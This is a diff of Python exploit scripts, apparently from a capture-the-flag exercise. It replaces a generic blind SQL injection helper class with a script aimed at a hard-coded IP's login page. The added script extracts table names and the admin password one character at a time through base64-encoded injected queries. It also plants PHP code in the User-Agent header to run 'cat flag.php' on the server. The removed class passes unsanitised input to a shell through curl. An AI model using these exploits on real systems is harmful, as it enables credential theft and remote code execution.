@@ -1,92 +1,58 @@
-import subprocess as sp
+#!/usr/bin/env python
 
-class BooleanBased:
-    # The template of payload, replacing the variable $cond to real condition.
-    payload = ""
-    # The template of condition, replacing the variable $index and $guess.
-    condition = ""
-    # The response recv if the query condition is true.
-    response = ""
-    # The SQLi target.
-    target = None
-    # Debug option
-    debug = False
+import requests
+import string
 
-    # The default method to send sqli payload to target, we can overwrite it in constructor if SQLi trigger point is unusual.
-    def send_payload(self, payload):
-        assert self.target != None, "The target is UNKNOWN."
-        p = sp.Popen("curl " + self.target + payload, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
-        return p.stdout.read()
+post = requests.post
+get = requests.get
+success_pattern = "Hello, test"
 
-    def __init__(self, payload, condition, response, send_payload = None, target = None, debug = None):
-        self.payload = payload
-        self.condition = condition
-        self.response = response
-        if send_payload != None:
-            self.send_payload = send_payload
+def login(uri, user, passwd, headers = None):
+    post_data = {"username": user, "password": passwd}
+    r = post(uri, data = post_data, headers = headers)
+    return r
 
-        self.target = target
-        if debug != None:
-            self.debug = debug
-    
-    def binsearch(self, a, b, index = None, num = False):
-        orig_cond = self.condition
-        orig_a = a
-        orig_b = b
-        if index != None:
-            self.condition = self.condition.replace("$index", str(index))
 
-        while b > a:
-            found = False
-            if (b - a) == 1:
-                b = mid = a
-            elif (a + b) % 2 == 0:
-                mid = (a + b) / 2
-            else:
-                mid = (a + b) / 2 + 1
+def guess_len(m):
+    for i in range(m):
+        table_name = "information_schema.tables"
+        len_query = "LENGTH((SeLeCT table_name FROM {} WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 0,1))".format(table_name)
+        payload = "AND {}={}#".format(len_query, i+1)
+        #payload = "AND (SELECT 'aaaa' FROM {})='aaaa'#".format(table_name)
+        query = "test' " + payload
+        user = query.encode("base64").replace("\n", "")
+        if "Hello, test" in login("http://140.113.194.85:49165/loginsystem/login.php", user, "test".encode("base64")).text:
+            print "Length of password: {}".format(i+1)
+            return i+1
 
-            if not num:
-                cond = self.condition.replace("$guess", chr(mid))
-            else:
-                cond = self.condition.replace("$guess", str(mid))
+def guess_char(l):
+    passwd = ""
+    for index in range(l):
+        for i in range(0x20, 0x7f):
+            row = 0 
+            #table_name = "information_schema.tables"
+            #guess_query = "(SeLeCT table_name FROM {} WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT {},1)".format(table_name, row)
+            table_name = "user"
+            guess_query = "(SeLeCT password FROM {} WHERE username='admin' LIMIT {},1)".format(table_name, row)
+            payload = "AND ASCII(SUBSTR({}, {}, 1)) = {}#".format(guess_query, index + 1, i)
+            query = "test' " + payload
+            user = query.encode("base64").replace("\n", "")
+            if success_pattern in login("http://140.113.194.85:49165/loginsystem/login.php", user, "test".encode("base64")).text:
+                print chr(i),
+                passwd += chr(i)
+                break
 
-            payload = self.payload.replace("$cond", cond)
-            if self.debug:
-                print payload
-                raw_input()
+    return passwd
 
-            buf = self.send_payload(payload)
-            if self.response in buf:
-                found = True
-                a = mid
-            else:
-                b = mid
+def user_agent():
+    headers = {'user-agent': '<?php system("cat flag.php");?>'}
+    r = login("http://140.113.194.85:49165/loginsystem/login.php", \
+        "admin".encode("base64"), \
+        "gogopowerranger".encode("base64"), \
+        headers = headers)
+    print r.text
+            
+#l = guess_len(100)
+#print guess_char(32)
+user_agent()
 
-        if num:
-            errmsg = "Length is not in range %d ~ %d." % (orig_a, orig_b)
-        else:
-            errmsg = "Index %d character is not in range %d ~ %d." % (index, orig_a, orig_b)
-        assert found , errmsg
-        self.condition = orig_cond
-        return mid
-
-    def guess_length(self, minlen, maxlen):
-        return self.binsearch(minlen, maxlen, num = True)
-
-    def guess_text(self, length, verbose = False):
-        text = ""
-        for i in range(length):
-            text += chr(self.binsearch(0x20, 0x80, index = i+1))
-            if verbose:
-                print ("index %3d: " + text) % (i+1)
-
-        return text
-
-    def guess_ascii(self, length, verbose = False):
-        text = ""
-        for i in range(length):
-            text += chr(self.binsearch(0x20, 0x80, index = i+1, num = True))
-            if verbose:
-                print ("index %3d: " + text) % (i+1)
-
-        return text
